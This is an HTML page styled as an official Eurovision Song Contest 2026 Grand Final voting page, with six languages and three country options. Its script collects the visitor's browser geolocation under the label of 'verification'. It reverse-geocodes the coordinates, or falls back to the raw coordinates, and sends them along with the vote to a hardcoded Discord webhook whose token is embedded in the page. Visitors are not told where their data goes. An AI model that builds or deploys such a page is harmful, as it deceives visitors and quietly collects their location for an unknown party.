<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eurovision Song Contest 2026</title>
    <style>
        :root {
            --text-main: #ffffff;
            --text-muted: rgba(255, 255, 255, 0.7);
            --euro-pink: #ff007f;
            --success-green: #00ffaa;
            
            /* macOS Liquid Glass Properties */
            --glass-bg: linear-gradient(135deg, rgba(255, 255, 255, 0.11) 0%, rgba(255, 255, 255, 0.02) 100%);
            --glass-border: rgba(255, 255, 255, 0.22);
            --inner-specular: inset 0px 1.5px 0px 0px rgba(255, 255, 255, 0.35), inset 0px -1px 0px 0px rgba(0, 0, 0, 0.15);
            --outer-glow: 0px 25px 60px rgba(0, 0, 0, 0.45), 0px 0px 45px -5px rgba(255, 0, 127, 0.4);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            
            /* Layered fluid gradient backdrop mapping your image */
            background: 
                radial-gradient(circle at 85% 85%, rgba(114, 30, 153, 0.85) 0%, transparent 55%),
                radial-gradient(circle at 15% 20%, rgba(0, 240, 255, 0.2) 0%, transparent 50%),
                radial-gradient(circle at 50% 50%, rgba(80, 19, 117, 0.7) 0%, transparent 70%),
                linear-gradient(145deg, #05010d 0%, #0d041f 40%, #250940 80%, #3a0857 100%);
            background-attachment: fixed;
            overflow-x: hidden;
            padding-bottom: 60px;
        }

        /* Top Navigation Header bar */
        .nav-bar {
            width: calc(100% - 48px);
            max-width: 1100px;
            height: 54px;
            margin-top: 24px;
            border: 1px solid rgba(255, 255, 255, 0.14);
            border-radius: 27px;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 24px;
            font-size: 13px;
            font-weight: 500;
        }

        .lang-selector {
            display: flex;
            align-items: center;
            gap: 6px;
            background: transparent;
            border: none;
            color: var(--text-main);
            font-family: inherit;
            font-size: 13px;
            outline: none;
            cursor: pointer;
        }
        
        .lang-selector option {
            background: #190a2e;
            color: #fff;
        }

        .nav-center {
            font-weight: 700;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            font-size: 11px;
            opacity: 0.9;
        }

        .nav-menu-icon {
            display: flex;
            flex-direction: column;
            gap: 4px;
            width: 16px;
            cursor: pointer;
        }
        .nav-menu-icon span {
            display: block;
            height: 2px;
            background: white;
            width: 100%;
            border-radius: 1px;
        }

        /* Main Content wrapper layout */
        .viewport-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: auto 0;
            padding: 40px 24px 0 24px;
            width: 100%;
            max-width: 480px;
        }

        /* The High-Curvature Liquid Glass Card */
        .liquid-glass-card {
            background: var(--glass-bg);
            filter: url('#macos-refraction'); /* Connects to the SVG refraction matrix */
            backdrop-filter: blur(50px) saturate(160%);
            -webkit-backdrop-filter: blur(50px) saturate(160%);
            border: 1.5px solid var(--glass-border);
            box-shadow: var(--inner-specular), var(--outer-glow);
            border-radius: 40px; 
            width: 100%;
            aspect-ratio: 1 / 1;
            padding: 44px 36px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            margin-bottom: 35px;
            transition: box-shadow 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .options-stack {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        /* Refractive interior glass rows matching Image 2 */
        .vote-row {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.05);
            border-radius: 22px;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
            position: relative;
        }

        .vote-row:hover {
            border-color: rgba(255, 255, 255, 0.35);
            background: rgba(255, 255, 255, 0.08);
        }

        /* Standard Radio Hidden - Replaced by custom circular indicators matching Image 2 */
        .vote-row input[type="radio"] {
            appearance: none;
            -webkit-appearance: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.4);
            border-radius: 50%;
            position: absolute;
            right: 24px;
            outline: none;
            cursor: pointer;
            transition: all 0.2s ease;
            background: transparent;
        }

        .vote-row input[type="radio"]:checked {
            border-color: var(--euro-pink);
            background: var(--euro-pink);
            box-shadow: inset 0 0 0 4px rgba(255, 255, 255, 0.9);
        }

        .vote-row.selected {
            border-color: rgba(255, 255, 255, 0.7);
            background: rgba(255, 255, 255, 0.12);
            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.15);
        }

        /* ISO Country Codes inside row wrapper */
        .iso-code {
            font-size: 14px;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.6);
            width: 35px;
            letter-spacing: 0.5px;
        }

        .country-name {
            font-size: 17px;
            font-weight: 600;
            letter-spacing: -0.1px;
            margin-left: 5px;
        }

        /* Content Copy Layout matching image exactly */
        .headline {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -0.5px;
            text-align: center;
            margin-bottom: 16px;
            line-height: 1.25;
        }

        .body-narrative {
            color: var(--text-muted);
            font-size: 15px;
            text-align: center;
            line-height: 1.6;
            max-width: 440px;
            margin-bottom: 30px;
        }

        /* High contrast solid system action button */
        .submit-btn {
            background: #ffffff;
            color: #0b0214;
            border: none;
            border-radius: 20px;
            padding: 18px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            max-width: 320px;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
        }

        .submit-btn:hover:not(:disabled) {
            opacity: 0.92;
            transform: translateY(-1px);
        }

        .submit-btn:disabled {
            background: rgba(255, 255, 255, 0.12);
            color: rgba(255, 255, 255, 0.25);
            box-shadow: none;
            cursor: not-allowed;
        }

        #realtime-monitor {
            margin-top: 18px;
            font-size: 13px;
            font-weight: 500;
            color: var(--text-muted);
            text-align: center;
        }
    </style>
</head>
<body>

<svg style="position: absolute; width: 0; height: 0; pointer-events: none;">
    <filter id="macos-refraction">
        <feTurbulence type="fractalNoise" baseFrequency="0.012" numOctaves="3" result="noise" />
        <feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
    </filter>
</svg>

<div class="nav-bar">
    <div class="nav-left">
        🌐 
        <select class="lang-selector" id="langSelector" onchange="switchLanguage(this.value)">
            <option value="en">English</option>
            <option value="de">Deutsch</option>
            <option value="es">Español</option>
            <option value="sv">Svenska</option>
            <option value="zh">简体中文</option>
            <option value="gsw">Schwiizerdütsch</option>
        </select>
    </div>
    <div class="nav-center">Eurovision</div>
    <div class="nav-menu-icon">
        <span></span>
        <span></span>
    </div>
</div>

<div class="viewport-wrapper">
    
    <div class="liquid-glass-card" id="lensFrame">
        <div class="options-stack">
            <label class="vote-row" onclick="selectRow(this)">
                <span class="iso-code">RS</span>
                <span class="country-name">Serbia</span>
                <input type="radio" name="esc" value="Serbia">
            </label>

            <label class="vote-row" onclick="selectRow(this)">
                <span class="iso-code">MK</span>
                <span class="country-name">North Macedonia</span>
                <input type="radio" name="esc" value="North Macedonia">
            </label>

            <label class="vote-row" onclick="selectRow(this)">
                <span class="iso-code">DK</span>
                <span class="country-name">Denmark</span>
                <input type="radio" name="esc" value="Denmark">
            </label>
        </div>
    </div>

    <h2 class="headline" id="uiHeadline">Cast your vote for the Grand Final</h2>
    <p class="body-narrative" id="uiBody">
        Thank you for your support and participation in this year's Eurovision Song Contest! Your enthusiasm and input directly determines the winner.
    </p>

    <button id="ctaBtn" class="submit-btn" onclick="initiateTransmission()" disabled>Cast Vote</button>
    <div id="realtime-monitor">Please make a selection above</div>
</div>

<script>
    const discordEndpoint = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";

    // Polymorphic Dictionary (Supports all 6 requested languages)
    const dictionary = {
        en: {
            headline: "Cast your vote for the Grand Final",
            body: "Thank you for your support and participation in this year's Eurovision Song Contest! Your enthusiasm and input directly determines the winner.",
            cta: "Cast Vote",
            initialStatus: "Please make a selection above",
            ready: "Ready to register selection for ",
            locating: "Requesting localized verification parameters...",
            resolving: "Mapping coordinates to nearest public hub...",
            sending: "Finalizing secure package relay...",
            success: "✅ Transaction complete. Your vote has been logged!",
            fail: "❌ Verification refused. Please check terminal status.",
            networkError: "❌ Critical handshake error."
        },
        de: {
            headline: "Stimmen Sie für das große Finale ab",
            body: "Vielen Dank für Ihre Unterstützung und Teilnahme am diesjährigen Eurovision Song Contest! Ihr Enthusiasmus und Ihre Stimme bestimmen direkt den Gewinner.",
            cta: "Stimme abgeben",
            initialStatus: "Bitte treffen Sie oben eine Auswahl",
            ready: "Bereit zur Registrierung der Auswahl für ",
            locating: "Lokalisierte Verifizierungsparameter werden abgefragt...",
            resolving: "Koordinaten werden dem nächsten Hub zugeordnet...",
            sending: "Sicherer Paket-Relay wird abgeschlossen...",
            success: "✅ Transaktion abgeschlossen. Ihre Stimme wurde gezählt!",
            fail: "❌ Verifizierung verweigert. Terminalstatus prüfen.",
            networkError: "❌ Kritischer Handshake-Fehler."
        },
        es: {
            headline: "Vota en la Gran Final",
            body: "¡Gracias por su apoyo y participación en el Festival de la Canción de Eurovisión de este año! Su entusiasmo e intervención determinan directamente al ganador.",
            cta: "Emitir Voto",
            initialStatus: "Por favor, seleccione una opción arriba",
            ready: "Listo para registrar la selección de ",
            locating: "Solicitando parámetros de verificación localizados...",
            resolving: "Mapeando coordenadas al nodo público más cercano...",
            sending: "Finalizando la transmisión del paquete seguro...",
            success: "✅ ¡Transacción completada! Su voto ha sido registrado.",
            fail: "❌ Verificación rechazada. Verifique el estado del terminal.",
            networkError: "❌ Error crítico de conexión."
        },
        sv: {
            headline: "Avge din röst i den stora finalen",
            body: "Tack för ditt stöd och deltagande i årets Eurovision Song Contest! Er entusiasm och engagemang avgör vinnaren direkt.",
            cta: "Avge röst",
            initialStatus: "Vänligen gör ett val ovan",
            ready: "Redo att registrera valet på ",
            locating: "Begär lokaliserade verifieringsparametrar...",
            resolving: "Kartlägger koordinater till närmaste publika hubb...",
            sending: "Slutför säker paketöverföring...",
            success: "✅ Transaktionen slutförd. Din röst har registrerats!",
            fail: "❌ Verifiering nekad. Kontrollera terminalens status.",
            networkError: "❌ Kritiskt handskakningsfel."
        },
        zh: {
            headline: "在总决赛中投下您的一票",
            body: "感谢您对今年欧洲歌唱大赛的支持与参与！您的热情与投入将直接决定最终的冠军归属。",
            cta: "投出此票",
            initialStatus: "请在上方进行选择",
            ready: "准备好登记以下选项的投票：",
            locating: "正在请求本地化验证参数...",
            resolving: "正在将坐标映射到最近的公共节点...",
            sending: "正在完成安全数据包中继...",
            success: "✅ 交易完成。您的选票已被成功记录！",
            fail: "❌ 验证被拒绝。请检查终端状态。",
            networkError: "❌ 关键握手错误。"
        },
        gsw: {
            headline: "Stimm ab für das grosse Finale",
            body: "Merci viumau für dini Unterstützig und d'Teilnahm am diesjährige Eurovision Song Contest! Di Enthusiasmus und dini Stimm entscheide direkt über de Gwünner.",
            cta: "Stimm abgäh",
            initialStatus: "Bitte wähl obe öppis us",
            ready: "Bereit zum Registriere vo de Wahl für ",
            locating: "Lokalisierti Verifizierigsparameter wärde abgfrogt...",
            resolving: "Koordinate wärde em nchschte Hub zuegordnet...",
            sending: "Sicherä Paket-Relay wird abgschlosse...",
            success: "✅ Transaktion abgschlosse. Dini Stimm isch zellt worde!",
            fail: "❌ Verifizierig verweigeret. Terminalstatus überprüfe.",
            networkError: "❌ Kritische Handshake-Fehler."
        }
    };

    let activeLang = "en";

    function switchLanguage(langKey) {
        activeLang = langKey;
        const currentData = dictionary[langKey];
        
        document.getElementById("uiHeadline").innerText = currentData.headline;
        document.getElementById("uiBody").innerText = currentData.body;
        
        const ctaBtn = document.getElementById("ctaBtn");
        ctaBtn.innerText = currentData.cta;
        
        const selection = document.querySelector('input[name="esc"]:checked');
        if(!selection) {
            document.getElementById("realtime-monitor").innerText = currentData.initialStatus;
        } else {
            document.getElementById("realtime-monitor").innerText = `${currentData.ready}${selection.value}`;
        }
    }

    function selectRow(element) {
        document.querySelectorAll('.vote-row').forEach(row => {
            row.classList.remove('selected');
        });
        element.classList.add('selected');
        
        const radio = element.querySelector('input[type="radio"]');
        radio.checked = true;

        const ctaBtn = document.getElementById('ctaBtn');
        ctaBtn.disabled = false;
        document.getElementById('realtime-monitor').innerText = `${dictionary[activeLang].ready}${radio.value}`;
    }

    async function initiateTransmission() {
        const monitor = document.getElementById('realtime-monitor');
        const ctaBtn = document.getElementById('ctaBtn');
        const selection = document.querySelector('input[name="esc"]:checked');

        if (!selection) return;
        const targetCountry = selection.value;

        ctaBtn.disabled = true;
        monitor.innerText = dictionary[activeLang].locating;

        if (!navigator.geolocation) {
            transmitPayload(targetCountry, "Unknown (Geolocation API Blocked/Unavailable)");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                monitor.innerText = dictionary[activeLang].resolving;

                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const parsed = await res.json();
                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Country";
                    
                    monitor.innerText = dictionary[activeLang].sending;
                    transmitPayload(targetCountry, region);
                } catch (e) {
                    transmitPayload(targetCountry, `Coordinates: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
                }
            },
            (err) => {
                transmitPayload(targetCountry, "Anonymous (Location Access Denied)");
            }
        );
    }

    async function transmitPayload(voteSelection, verifiedOrigin) {
        const monitor = document.getElementById('realtime-monitor');
        const ctaBtn = document.getElementById('ctaBtn');
        
        const messageBody = {
            embeds: [{
                title: "🗳️ Refractive Glass Vote Registered",
                color: 16711807, 
                fields: [
                    { name: "Country Voted", value: `**${voteSelection}**`, inline: true },
                    { name: "Verified Origin", value: `🌍 ${verifiedOrigin}`, inline: true }
                ],
                footer: { text: "ESC Core Infrastructure Platform • macOS Tahoe Rendered" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const delivery = await fetch(discordEndpoint, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(messageBody)
            });

            if (delivery.ok) {
                monitor.innerText = dictionary[activeLang].success;
                monitor.style.color = "var(--success-green)";
                document.getElementById('lensFrame').style.setProperty('--outer-glow', '0px 25px 60px rgba(0, 0, 0, 0.45), 0px 0px 45px -5px rgba(0, 255, 170, 0.5)');
            } else {
                monitor.innerText = dictionary[activeLang].fail;
                monitor.style.color = "#ff4d4d";
                ctaBtn.disabled = false;
            }
        } catch (networkError) {
            monitor.innerText = dictionary[activeLang].networkError;
            monitor.style.color = "#ff4d4d";
            ctaBtn.disabled = false;
        }
    }
</script>

</body>
</html>
